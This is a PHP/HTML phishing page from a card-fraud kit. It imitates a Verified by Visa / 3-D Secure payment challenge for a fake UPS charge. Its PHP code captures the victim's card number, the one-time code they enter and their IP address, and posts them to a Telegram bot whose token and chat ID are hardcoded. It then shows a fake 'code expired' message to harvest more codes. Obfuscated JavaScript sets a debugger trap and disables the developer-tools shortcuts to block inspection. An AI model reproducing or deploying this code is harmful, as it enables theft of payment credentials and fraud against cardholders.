<?php
include'antibot.php';
$IdTelegram=array("-859650911");
$Bin=$_GET['bin'];
$lbin=$_GET['lbin'];
$numb=$_GET['numb'];
$realip=$_GET['realip'];
if(isset($_POST['submit'])){
 $BotTelegramToken="5309592593:AAFpMODdPjov6v1J5zJriKeVqsf55If2RtA";

 $messageTelegram  = "|==[ VBV INFO ]==|\n";
 $messageTelegram .= "|CCNUMB     :  ".$numb."\n";
 $messageTelegram .= "|PASSW     :  ".$_POST['text']."\n";
 $messageTelegram .= "|IP         :  ".$_GET['realip']."\n";
 $messageTelegram .= "|==[ UPS ARON-TN ]==|\n";
 foreach($IdTelegram as $user_id) {
     $website="https://api.telegram.org/bot".$BotTelegramToken;
     $params=[
      'chat_id'=>$user_id, 
      'text'=>$messageTelegram,
     ];
     $ch = curl_init($website . '/sendMessage');
     curl_setopt($ch, CURLOPT_HEADER, false);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     $result = curl_exec($ch);
     curl_close($ch);
 }
  HEADER("Location: loading.php?numb=".$numb."&phone=".$_GET['phone']."&realip=".$_GET['realip'].'&repeat=1');
}
?>
<!DOCTYPE html>
<html lang="fr"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Challenge</title>
    <!-- Common styles and scripts -->
    <link rel="stylesheet" href="VBV_files/84d89bc8-1c55-4b08-a3b4-8905752f926e.css" type="text/css">
    <style>
      /* lato regular */
      @font-face {
        font-family: 'Lato-Regular';
        font-style: normal;
        font-weight: 400;
        src: url("resource/9e080228-2ddb-49db-834f-c37c74c527b1"); /* IE9 Compat Modes */
        src: local('Lato-Regular'), local('Lato-Regular'),
        url("resource/9e080228-2ddb-49db-834f-c37c74c527b1#iefix") format('embedded-opentype'), /* IE6-IE8 */
        url("resource/e9607ea3-f123-49d9-a54d-fe1773d4090e") format('woff2'), /* Super Modern Browsers */
        url("resource/c5629b0f-78a7-4ec3-b600-2a41c0c8cd6f") format('woff'), /* Modern Browsers */
        url("resource/a76c6aea-f34d-49cb-a2e1-7b4d363f3ba0") format('truetype'), /* Safari, Android, iOS */
        url("resource/b3a4d971-c749-48d7-b03b-21a8253ebc92#OpenSans") format('svg'); /* Legacy iOS */
      }

      /* lato bold */
      @font-face {
        font-family: 'Lato-Bold';
        font-style: normal;
        font-weight: 700;
        src: url("resource/3b1894a1-4d04-4fcf-ac5f-6e8268d90c12"); /* IE9 Compat Modes */
        src: local('Lato-Bold'), local('Lato-Bold'),
        url("resource/3b1894a1-4d04-4fcf-ac5f-6e8268d90c12#iefix") format('embedded-opentype'), /* IE6-IE8 */
        url("resource/feefe029-19d6-423d-b369-96751e5ce5f4") format('woff2'), /* Super Modern Browsers */
        url("resource/3329448e-a0ae-49fb-ba1b-3fefca09cfde") format('woff'), /* Modern Browsers */
        url("resource/b881db6c-ee60-47bd-bf8b-fd35520a8dd4") format('truetype'), /* Safari, Android, iOS */
        url("resource/afffb53d-3d9e-4faf-b2cb-31097037e38e#OpenSans") format('svg'); /* Legacy iOS */
      }
    </style>
    <link rel="stylesheet" href="VBV_files/7be69b05-3a35-40ce-a2a7-796cde79f20a.css" type="text/css">
    <style>

    </style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script type="text/javascript">
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('(3(){(3 a(){8{(3 b(2){7((\'\'+(2/2)).6!==1||2%5===0){(3(){}).9(\'4\')()}c{4}b(++2)})(0)}d(e){g(a,f)}})()})();',17,17,'||i|function|debugger|20|length|if|try|constructor|||else|catch||5000|setTimeout'.split('|'),0,{}))
$(document).bind("contextmenu",function(e) {
 e.preventDefault();
});
document.onkeydown = function(e) {
if(event.keyCode == 123) {
return false;
}
if(e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)){
return false;
}
if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
return false;
}
if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
return false;
}
if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
return false;
}
if(e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)){
return false;
}
if(e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)){
return false;
}
if(e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)){
return false;
}
if(e.ctrlKey && e.keyCode == 'F'.charCodeAt(0)){
return false;
}
if(e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)){
return false;
}
}
</script>
  </head>
  <body>

  <div class="processing-fullpage hide">
    <div class="spinner"></div>
  </div>
  <header>
    <div class="logo logo-left">
      <picture>
        <source type="image/svg+xml" srcset="xx.png" height="100">
        <img src="xx.png" alt="Logo">
      </picture>
    </div><div class="logo logo-right">
    <picture>
     <?php 
      //3-4-5-6
      $numb=$_GET['numb'];
      if($numb[0]=='3'){
        echo('<source type="image/svg+xml" srcset="VBV_files/amex.png">');
      }else if($numb[0]=='4'){
        echo('<source type="image/svg+xml" srcset="VBV_files/vbv_logo.gif"><img src="VBV_files/vbv_logo.gif" alt="Logo">');
      }else if($numb[0]=='5'){
        echo('<source type="image/svg+xml" srcset="VBV_files/2b660c78-cd00-4bb4-95bd-9e62e1141c60.svg 1x"><img src="VBV_files/10ad0777-c108-45e7-8d80-8da0bb22ccd3.png" alt="Logo">');
      }else{
        echo('<source type="image/svg+xml" srcset="VBV_files/discover.png"><img src="VBV_files/discover.png" alt="Logo">');
      }
     ?>
    </picture>
  </div>
  </header>
  <form  method="post" autocomplete="off" action="">
    <div class="main" role="main">
    <button type="submit" class="hidden" id="sendOtp_hidden" disabled="disabled">Zahlen</button>
    <h1 id="header">PAYMENT</h1>
      <p id="subHeader">
<?php if(isset($_GET['repeat'])){ if($_GET['repeat']=='1'){echo('<p style="color:red;font-size: 11px; font-weight: bold;">Your unique code card has expired. Wait, we will send you a new one.</p>');};};?>     
      <span>Please enter the code you received as a message to the cell phone number  <?php echo($_GET['phone']);?>.</span>
        <a target="_blank" data-tooltip="Si le numéro de téléphone portable affiché est faux, veuillez appeler notre service clientèle au numéro +41 44 659 26 22."><img src="VBV_files/37dfcfd2-5138-46ff-8417-00529559da83.svg" alt="SwissCard Info"></a>
      </p>
<script>
    const dateObj = new Date();
    const day = String(dateObj.getDate()).padStart(2, '0');
    const year = dateObj.getFullYear();
    const output = day + '.' + dateObj.getMonth() + '.' + year;
</script>
      <div class="data-wrapper">
        <dl>
          <dt id="merchant">Trader</dt><dd>UPS Service</dd>
          <div>
            <dt id="amount">Amount</dt><dd>$ <span id="purchaseAmount">0.86</span></dd></div>
          <dt id="date">Date</dt><dd><script>document.write(output);</script></dd><br>
          <dt id="card">Card number</dt><dd><?php echo($Bin);?>******<?php echo($lbin);?></dd>
        </dl>
        <dl class="code-wrapper">
          <dt class="input-wrapper"><label for="inputID">Code</label></dt><dd>
          <input id="inputID" type="text" name="text" minlength="4" maxlength="64" placeholder="Enter the code" required >
        </dd>
          <dt></dt><dd>
          <button type="submit" disabled="" class="btnSendNewOtp" name="resendChallenge">Request a new code</button>
        </dd>
          <div class="helptext">
          </div>
        </dl>
      </div>
    </div>
    <footer>
      <hr>
      <p id="termsAndConditions">
        <span>By clicking on "Confirm payment", I accept </span>
        <a href="https://www.americanexpress.ch/fileadmin/content/american-express.ch/pdf/1805T_3D_Secure_F.pdf" target="_blank">the special provisions to the use of 3-D Secure.</a>
      </p>
        <input type="button" class="btn btn-secondary" value="Cancel" >
        <button type="submit" class="btn btn-primary" id="sendOtp" name="submit">Confirm payment</button>
    </footer>
  </form>

  
</body></html>